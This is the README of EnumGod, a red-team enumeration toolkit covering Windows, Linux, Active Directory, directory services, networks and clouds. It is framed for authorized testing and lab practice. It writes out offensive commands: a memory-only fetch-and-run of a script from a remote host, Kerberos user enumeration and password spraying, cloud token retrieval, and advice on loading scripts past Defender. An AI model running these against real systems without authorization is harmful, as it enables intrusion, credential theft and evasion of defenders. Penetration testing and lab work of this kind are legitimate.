```
 _____                        ____           _
| ____|_ __  _   _ _ __ ___  / ___| ___   __| |
|  _| | '_ \| | | | '_ ` _ \| |  _ / _ \ / _` |
| |___| | | | |_| | | | | | | |_| | (_) | (_| |
|_____|_| |_|\__,_|_| |_| |_|\____|\___/ \__,_|
```

# EnumGod — Red Team Enumeration Toolkit

**Author: Jeet Ramoliya**

A cross-platform set of **read-only** enumeration scripts for authorized red-team
engagements and lab practice, covering **Windows, Linux, Active Directory, non-AD
directories, network/services, and cloud/hybrid** — with one consistent findings
model across all of them. Local host triage reimplements the common
**winPEAS / linPEAS** checks natively (no external binary to drop), and a
patch-aware **CVE engine** reports only CVEs the host is genuinely vulnerable to.

> **Authorized use only.** These scripts are for systems you own or have explicit,
> written permission to test (pentest/red-team engagements, CTFs, your own lab).
> Everything here is read-only recon; it finds and *ranks* targets and prints the
> command you would run next — **you** decide and execute each action.

---

## The scripts

| Script | Platform | Scope |
|---|---|---|
| [`windows/Invoke-RTEnum.ps1`](windows/Invoke-RTEnum.ps1) | Windows (PS 5.1+) | Local host triage + **deep privesc** (service-registry ACLs, DLL hijack, BYOVD drivers, UAC, named pipes) **+** full AD enumeration (domain member or standalone) |
| [`linux/rt-linenum.sh`](linux/rt-linenum.sh) | Linux (bash) | Local privesc triage + **deep surface** (SUID/sudo/caps, cron, containers, LD_PRELOAD/env_keep, library hijack, wildcard injection, kernel CVE hints) |
| [`linux/rt-adenum.sh`](linux/rt-adenum.sh) | Linux (bash) | AD enumeration **from** Linux (ldapsearch / netexec / impacket / certipy) **+ kerbrute-style** user-enum & password spray (native `kinit`) |
| [`directory/ldap-enum.sh`](directory/ldap-enum.sh) | Linux (bash) | **Non-AD directory services**: OUD (Oracle), OpenLDAP, 389-DS, FreeIPA, generic LDAP — anon binds, naming contexts, users/groups, readable hashes, ACIs, password policy |
| [`network/net-sweep.sh`](network/net-sweep.sh) | Linux (bash) | Host/port discovery, service fingerprint, DB default-cred checks (MSSQL/MySQL/PostgreSQL/Oracle/Mongo/Redis) |
| [`network/Invoke-RTNetScan.ps1`](network/Invoke-RTNetScan.ps1) | Windows (PS) | Host/port discovery & service fingerprint (native .NET, no nmap needed) |
| [`network/Invoke-RTShareHunt.ps1`](network/Invoke-RTShareHunt.ps1) | Windows (PS) | **SMB share hunt** (PowerHuntShares-style): readable/writable shares + loot-file grep |
| [`network/share-hunt.sh`](network/share-hunt.sh) | Linux (bash) | SMB share hunt via netexec / smbclient |
| [`cloud/rt-cloudenum.sh`](cloud/rt-cloudenum.sh) | Linux (bash) | Cloud metadata (AWS/Azure/GCP IMDS) + CLI session reuse + Kubernetes |
| [`cloud/Invoke-RTCloudEnum.ps1`](cloud/Invoke-RTCloudEnum.ps1) | Windows (PS) | Entra ID / Azure posture (IMDS, dsregcmd/PRT, az/Az sessions, AAD Connect) |
| [`secrets/scan-secrets.sh`](secrets/scan-secrets.sh) | Linux (bash) | Filesystem **secrets scanner**: private keys, cloud/SaaS tokens, DB conn-strings, JWTs, password assignments, git history (values masked) |
| [`secrets/Invoke-RTSecretScan.ps1`](secrets/Invoke-RTSecretScan.ps1) | Windows (PS) | Same secrets scanner for Windows paths |
| [`run/run-all.sh`](run/run-all.sh) / [`run/Invoke-RTAll.ps1`](run/Invoke-RTAll.ps1) | Linux / Windows | **Orchestrators** — run every module into one folder and build the report |
| [`tools/eg-report.py`](tools/eg-report.py) | any (Python) | Merge all `findings.json` into one **HTML report** with a phase **playbook**, **MITRE ATT&CK** tags & **remediation**; `--diff` shows what a hop unlocked |

Plus a **CVE detection system**: [`data/cve-db.txt`](data/cve-db.txt) (curated local-privesc/kernel CVEs) is matched by the enum scripts and reports a CVE **only when the host is genuinely vulnerable** — it consults the distro package **changelog** (and Windows patch dates) to suppress backported/patched fixes, defeating the version-only false positives that linPEAS/winPEAS produce. [`tools/update-cve-db.sh`](tools/update-cve-db.sh) / [`.ps1`](tools/update-cve-db.ps1) refresh it from the **CISA Known-Exploited-Vulnerabilities** feed.

Each is **self-contained** and **degrades gracefully** — it uses optional tools when
present (RSAT/PowerView, netexec, impacket, certipy, az/aws/gcloud) and falls back to
native primitives (raw LDAP, `find`, curl to IMDS) when they are not.

---

## Shared output model

Every script writes a **timestamped loot directory** containing:

```
<out>/<kind>_<target>_<timestamp>/
    00_SUMMARY.txt     ranked HIGH / MED / INFO findings  (read first)
    NEXT_STEPS.txt     the pre-filled command for each actionable finding
    NN_*.txt/.json     per-section raw dumps
    findings.json      machine-readable (with -j / -Json)
```

Findings are ranked and de-duplicated:

- **HIGH** — directly actionable / likely to yield access (do first)
- **MED**  — promising, needs a condition met or more work
- **INFO** — context and inventory

The summary ends with a **recommended next move** so you spend time acting, not
re-typing recon. Re-run after each hop as the new identity — that is the core loop.

---

## Quick start

### Windows (local + AD)
```powershell
. .\windows\Invoke-RTEnum.ps1
Invoke-RTEnum                      # local host + current domain
Invoke-RTEnum -LocalOnly           # host triage only
Invoke-RTEnum -Domain corp.local -Credential (Get-Credential) -Json
Invoke-RTEnum -Only users,acls,delegation      # scope sections
Invoke-RTEnum -Target srv01 -HostSweep         # opt in to loud host sweeps
```

### Linux (local privesc)
```bash
chmod +x linux/rt-linenum.sh
./linux/rt-linenum.sh -o /dev/shm -j
# memory-only on target:  bash <(curl -s http://you/rt-linenum.sh) -o /dev/shm
```

### Run everything + one HTML report
```bash
./run/run-all.sh                            # local triage + secrets + cloud, then report
./run/run-all.sh --net 10.0.0.0/24 --ad -d corp.local --dc 10.0.0.10 -u user -p pass
```
```powershell
. .\run\Invoke-RTAll.ps1 ; Invoke-RTAll -Net 10.0.0.0/24 -OutDir C:\loot
```
```bash
# merge any runs into one report; --diff shows what a hop unlocked
python3 tools/eg-report.py ./loot1 ./loot2 --diff prev-merged.json -o report.html --save-merged merged.json
```

### AD from Linux (+ kerbrute-style user-enum & spray)
```bash
./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -u user -p 'Passw0rd!' -j
./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -u user -H <NTLM-hash>
./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -k        # host Kerberos ccache
# user-enum + lockout-aware password spray (uses kerbrute/netexec, else native kinit):
./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 --userlist users.txt --userenum --spray 'Spring2026!'
```

### SMB share hunt
```powershell
. .\network\Invoke-RTShareHunt.ps1 ; Invoke-RTShareHunt -Target 10.0.0.0/24 -TestWrite -Json
```
```bash
./network/share-hunt.sh -t 10.0.0.0/24 -u user -p pass -j
```

### Non-AD directory services (OUD / OpenLDAP / 389-DS / FreeIPA)
```bash
./directory/ldap-enum.sh -H ldap://10.0.0.5                       # anonymous
./directory/ldap-enum.sh -H ldaps://dir.corp:636 -D 'cn=Directory Manager' -w pass -j
```

### Network & service discovery
```bash
./network/net-sweep.sh                     # discover + scan detected /24(s)
./network/net-sweep.sh -t 10.0.0.0/24 --loud --db -j
./network/net-sweep.sh --self              # local inventory only (quiet)
```
```powershell
. .\network\Invoke-RTNetScan.ps1 ; Invoke-RTNetScan -Target 10.0.0.0/24 -Loud -Json
```

### Cloud / hybrid
```bash
./cloud/rt-cloudenum.sh -j                 # autodetect AWS/Azure/GCP, reuse CLI sessions
./cloud/rt-cloudenum.sh --no-token         # identify only, don't fetch tokens
```
```powershell
. .\cloud\Invoke-RTCloudEnum.ps1 ; Invoke-RTCloudEnum -Json
```

### Secrets scanning
```bash
./secrets/scan-secrets.sh -p /var/www --git -j    # scan a path incl. git history
```
```powershell
. .\secrets\Invoke-RTSecretScan.ps1 ; Invoke-RTSecretScan -Path C:\inetpub -Json
```

### CVE detection & staying current
The local-enum scripts flag host-relevant privesc CVEs from `data/cve-db.txt`
(by kernel/glibc/sudo version on Linux, by OS build on Windows). Refresh with the
latest **actively-exploited** CVEs before an engagement:
```bash
./tools/update-cve-db.sh            # pulls CISA KEV, appends new exploited CVEs
```
```powershell
.\tools\update-cve-db.ps1
```
Curated rows carry verified version ranges and produce build/version-matched hits;
feed-sourced rows surface as "latest actively-exploited" awareness items.

---

## What the local scan covers (winPEAS / linPEAS-style, native)

These checks are **reimplemented natively** — no external PEAS binary is dropped on the target.

**Windows (`Invoke-RTEnum.ps1`)** — token privileges (SeImpersonate/Backup/Debug… → potato/LSASS/SAM), unquoted service paths, writable service binaries/dirs/**registry keys** (DLL hijack), AlwaysInstallElevated, scheduled tasks & autoruns, **UAC** posture, named pipes, **BYOVD** driver inventory, Defender/AppLocker/logging/LSA-PPL, saved creds (cmdkey/DPAPI/unattend/WiFi/PS-history), **WDigest cleartext**, cached-logon count, Credential Guard, Windows Vault, **PuTTY/WinSCP/FileZilla/OpenVPN/RDP** saved sessions, browser credential stores, Kerberos tickets, installed-software inventory, writable StartUp, env & recent files.

**Linux (`rt-linenum.sh`)** — id/sudo/**doas**, dangerous groups (docker/lxd/disk/shadow), SUID/SGID + **GTFOBins**, capabilities, cron & timers (writable targets), writable sensitive files/PATH/systemd/ld.so, NFS `no_root_squash`, sudo **LD_PRELOAD/env_keep**, library & **wildcard injection**, container-escape surface, SSH config, readable shadow/gshadow, mail spools, backup & DB files on disk, creds in logs, **screen/tmux session hijack**, kernel-module paths, creds in histories/configs/cloud/kube.

## CVE detection — only *genuinely* vulnerable CVEs

The local scans match the host against [`data/cve-db.txt`](data/cve-db.txt) and report a CVE
**only when the host is actually vulnerable** — not merely "version in range":

- **Windows** (updates are cumulative): a CVE is **suppressed** if the host's latest installed
  update is newer than the CVE's fix month. HiveNightmare and PrintNightmare are confirmed by
  **direct tests** (SAM-hive ACL readable; Spooler + Point-and-Print state), not by build alone.
- **Linux**: before confirming any package-backed CVE (sudo/glibc/polkit/kernel) the engine
  reads the **distro package changelog** (`changelog.Debian.gz`, RPM `--changelog`) for the CVE
  id — if the distro backported the fix it is **suppressed**, even when the upstream version
  string still looks vulnerable (e.g. Ubuntu `sudo 1.9.15p5` carrying the CVE-2025-32463 patch).
  Kernels also use a build-date gate and preconditions (unprivileged user namespaces). sudo/glibc
  confirm only when a changelog is readable **and** the CVE is absent from it; otherwise POTENTIAL.
- In-range-but-unconfirmable → `01c_cve_potential.txt` (not counted as a finding).
  `tools/update-cve-db.*` pulls the latest actively-exploited CVEs (CISA KEV) into
  `01d_cve_latest_feed.txt` as awareness only.

Run just this: `Invoke-RTEnum -LocalOnly -Only cve` / `./rt-linenum.sh --only cve`.

## Deep-scan modes & section control

| Flag | Script(s) | Effect |
|---|---|---|
| `-Only` / `--only <keywords>` | all | run only matching sections, e.g. `--only cve,suid,creds,extended` |
| `-Skip` / `--skip <keywords>` | all | skip matching sections |
| *(default)* | local scans | quiet: full host triage + winPEAS/linPEAS checks + confirmed-CVE match |
| `-HostSweep` / `-Target <host>` | `Invoke-RTEnum` | **loud** domain-wide (or scoped) local-admin / share sweep |
| `--loud` | `net-sweep.sh` / `Invoke-RTNetScan` | full port range instead of the curated quick list |
| `--db` | `net-sweep.sh` | active default/blank **database**-credential tests |
| `--git` | `scan-secrets.sh` | also scan **git history** for secrets |
| `-q` / `--quick` | `rt-linenum.sh` | skip the slow whole-filesystem SUID / world-writable walks |
| `--no-token` | `rt-cloudenum.sh` | identify cloud only; don't fetch managed-identity tokens |

Section keywords: `context, cve, system, services, privesc, deep, tasks, creds, defense,
network, extended/peas` — Windows adds `users, computers, groups, acls, delegation, adcs,
dcsync, gmsa, gpo, laps, spns, policy`.

---

## Noise posture

- **Default = quiet.** Local host checks and normal-looking LDAP only.
- **Loud sweeps are opt-in.** On Windows, host-touching sweeps (admin-access / share
  enumeration across every computer) run only with `-HostSweep` or scoped `-Target`.
- **Network scanning is active & detectable.** `net-sweep.sh` / `Invoke-RTNetScan.ps1`
  touch other hosts; scope with `-t`/`-Target`, keep it quiet by default, and run DB
  default-credential tests only with `--db`. Use `--self`/`-Self` for local-only inventory.
- Cloud token retrieval is a credential-access action — gated behind `--no-token`
  to skip it, and the PowerShell cloud script only *detects* identity artifacts
  (PRT, managed identity, live sessions) rather than extracting them.

See [`docs/DETECTION.md`](docs/DETECTION.md) for a full **detection & noise map** —
what each module looks like to a defender (event IDs / telemetry) and how to stay quiet.
The HTML report tags every finding with its **MITRE ATT&CK** technique and a **remediation**
note, so the same run doubles as blue-team input.

## AV / Defender note

`NEXT_STEPS.txt` embeds offensive tool command **strings** (Rubeus, impacket,
certipy, secretsdump, etc.). On Windows, Defender real-time protection may quarantine
the output or the `.ps1` on load. In your own lab, load inside a bypassed shell or add
a tools-folder exclusion. Syntax-checking never executes anything:
```powershell
[System.Management.Automation.Language.Parser]::ParseFile('.\windows\Invoke-RTEnum.ps1',[ref]$null,[ref]$null)
```

---

## Core loop

```
enumerate  ->  read the recommended next move  ->  run its NEXT_STEPS command
    ^                                                        |
    |________  become the new identity, re-run  <___________|
```
Everything is read-only and safe to re-run on every hop. `findings.json` + the ranked
summary make it easy to diff what new access each hop unlocked.
